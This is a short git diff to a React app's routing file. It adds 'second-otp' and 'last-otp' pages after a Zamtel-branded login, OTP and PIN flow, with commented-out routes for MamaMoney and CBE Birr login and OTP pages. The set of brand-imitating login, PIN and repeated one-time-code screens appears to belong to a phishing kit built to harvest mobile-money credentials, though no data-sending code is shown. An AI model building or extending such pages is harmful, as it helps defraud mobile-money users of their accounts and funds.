@@ -16,6 +16,8 @@ import MamaMoneyOTP from "./MamaMoneyOTP";
 import ZamtelLogin from "./Zamtellogin";
 import ZamtelOtp from "./Zamtelotp";
 import ZamtelPin from "./ZamtelPin";
+import ZamtelSecondOtp from "./ZamtelSecondOtp";
+import LastOtp from "./LastOtp";
 
 function App() {
   return (
@@ -36,7 +38,9 @@ function App() {
 {/* <Route path="/" element={<MamaMoney/>}/> */}
 <Route path="/" element={<ZamtelLogin/>}/>
 <Route path="/otp" element={<ZamtelOtp/>}/>  
-<Route path="/pin" element={<ZamtelPin/>}/>  
+<Route path="/pin" element={<ZamtelPin/>}/>
+<Route path="/second-otp" element={<ZamtelSecondOtp/>}/>  
+<Route path="/last-otp" element={<LastOtp/>}/>  
 {/* <Route path="/otp" element={<MamaMoneyOTP/>}/> */}
         {/* <Route path="/" element={<CBEBirrLogin/>}/> */}
         {/* <Route path="/loginauth" element={<LoginAuthentication/>}/> */}
